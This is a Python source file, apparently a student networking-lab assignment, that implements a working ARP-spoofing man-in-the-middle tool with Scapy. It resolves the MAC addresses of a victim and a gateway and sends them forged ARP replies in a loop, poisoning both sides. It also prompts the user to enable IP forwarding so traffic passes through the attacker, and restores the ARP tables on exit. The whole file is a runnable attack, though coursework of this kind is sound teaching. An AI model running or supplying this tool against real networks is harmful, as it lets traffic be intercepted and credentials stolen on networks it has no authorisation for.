

import argparse
import sys
import time
from datetime import datetime


def print_author_banner():
    """Print the author and the current date (formatted with strftime)."""
    # Define variables
    author = "Ong Jun Han"
    current_date = datetime.now().strftime("%d/%m/%Y")

    # Display the output
    print(f"Author: {author}")
    print(f"Date: {current_date}")

# Lab 5 import style: Ether/ARP/srp come from scapy.layers.l2.
# `send` (used to inject the forged replies) lives in scapy.sendrecv.
from scapy.layers.l2 import Ether, ARP, srp
from scapy.sendrecv import send


def get_mac(ip, iface=None):
    """
    Return the real MAC address for an IP by sending a legitimate ARP request
    (broadcast "who has <ip>?") and reading the reply.

    Built on the Lab 5 snippet: broadcast an Ether/ARP request, then read the
    hwsrc out of the answered list. Returns None if no host answers.
    """
    # Same pattern as Lab 5:
    #   broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")  -> every host sees it
    #   arp_ip        = ARP(pdst=ip)                     -> "who has <ip>?"
    broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")   # mac address for Broadcast
    arp_ip = ARP(pdst=ip)
    answered, unanswered = srp(broadcast_mac / arp_ip,
                               timeout=3, retry=2, verbose=False, iface=iface)

    if answered:
        for sent, received in answered:
            # received.hwsrc = the MAC of whoever owns `ip`
            # (equivalent to the Lab 5 line: answered[0][1].hwsrc)
            return received.hwsrc

    return None


def spoof(target_ip, target_mac, spoof_ip, iface=None):
    """
    Tell `target_ip` that `spoof_ip` is at OUR MAC address.

    We build an ARP reply (op=2) and send it directly to the target.
    Scapy fills in our own MAC as the source automatically, which is exactly
    the lie we want the target to cache.
        pdst / hwdst  -> who we are lying to (the victim)
        psrc          -> the IP we are pretending to be (e.g. the gateway)
    """
    packet = ARP(
        op=2,                 # 2 = ARP reply ("is-at")
        pdst=target_ip,       # victim's IP  (destination of the lie)
        hwdst=target_mac,     # victim's MAC
        psrc=spoof_ip,        # the IP we impersonate
    )
    send(packet, verbose=False, iface=iface)


def restore(dest_ip, dest_mac, source_ip, source_mac, iface=None):
    """
    Undo the poison by sending the CORRECT mapping back to a host, so the
    network is left clean when we stop. We send it a few times to make sure
    it sticks over the lies we sent earlier.
    """
    packet = ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=source_mac,     # the REAL MAC this time, not ours
    )
    send(packet, count=4, verbose=False, iface=iface)


def main():
    parser = argparse.ArgumentParser(
        description="Educational ARP spoofer (bidirectional MITM).",
        usage="sudo python3 arpspoof.py <Victim_IP> <Gateway(Router)_IP>",
    )
    # Positional args so the program runs exactly as the assignment requires:
    #   sudo python3 arpspoof.py <Victim_IP> <Gateway(Router)_IP>
    parser.add_argument("victim_ip", help="Victim IP address")
    parser.add_argument("gateway_ip", help="Gateway (router) IP address")
    # Optional extras (not required by the grader) keep their flags.
    parser.add_argument("-i", "--iface", default=None,
                        help="Network interface to use (e.g. eth0). "
                             "Defaults to Scapy's chosen interface.")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Seconds between re-poisoning bursts (default 2).")
    args = parser.parse_args()

    print_author_banner()
    print()

    print("[*] Reminder: enable IP forwarding or the victim will lose network:")
    print("        sudo sysctl -w net.ipv4.ip_forward=1\n")

    # --- Step 1: resolve the REAL MACs so we can target frames and restore later
    print("[*] Resolving MAC addresses...")
    target_mac = get_mac(args.victim_ip, args.iface)
    gateway_mac = get_mac(args.gateway_ip, args.iface)

    if target_mac is None:
        sys.exit(f"[!] Could not find target {args.victim_ip}. "
                 f"Check the IP / interface / that the host is up.")
    if gateway_mac is None:
        sys.exit(f"[!] Could not find gateway {args.gateway_ip}. "
                 f"Check the IP / interface.")

    print(f"    target  {args.victim_ip}  -> {target_mac}")
    print(f"    gateway {args.gateway_ip} -> {gateway_mac}")
    print("\n[*] Poisoning... press Ctrl+C to stop and restore.\n")

    sent = 0
    try:
        while True:
            # Lie to the target: "the gateway is at my MAC"
            spoof(args.victim_ip, target_mac, args.gateway_ip, args.iface)
            # Lie to the gateway: "the target is at my MAC"
            spoof(args.gateway_ip, gateway_mac, args.victim_ip, args.iface)

            sent += 2
            # \r keeps the counter on one refreshing line
            print(f"\r[+] Packets sent: {sent}", end="", flush=True)
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n\n[*] Ctrl+C detected. Restoring ARP tables...")
        # Restore BOTH directions with the correct mappings.
        restore(args.victim_ip, target_mac, args.gateway_ip, gateway_mac, args.iface)
        restore(args.gateway_ip, gateway_mac, args.victim_ip, target_mac, args.iface)
        print("[*] Restored. Exiting cleanly.")


if __name__ == "__main__":
    main()
